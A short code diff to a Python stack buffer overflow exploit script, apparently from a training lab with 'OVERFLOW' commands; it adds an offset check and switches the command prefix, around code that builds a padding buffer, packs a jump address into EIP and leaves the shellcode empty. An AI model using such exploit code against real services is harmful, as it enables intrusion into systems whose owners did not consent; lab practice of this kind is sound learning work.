@@ -9,8 +9,12 @@ import struct
 from typing import Optional
 
 def main(ip: str, port: int, eip_offset: int, overflow_threshold: int, jmp_address: hex) -> None:
+	if eip_offset > overflow_threshold:
+		print("The value of the offset cannot be bigger than the overflow threshold")
+		sys.exit(0)
+	
 	# Define prefix and buffer with encoded cyclic pattern
-	prefix = b"OVERFLOW2 "	# CHANGE
+	prefix = b"OVERFLOW1 "	# CHANGE
 	buffer = b"A" * eip_offset
 	eip = struct.pack('<I', jmp_address) # Transforms 0x625011AF into \xAF\x11\x50\x62
 	shellcode =  b""
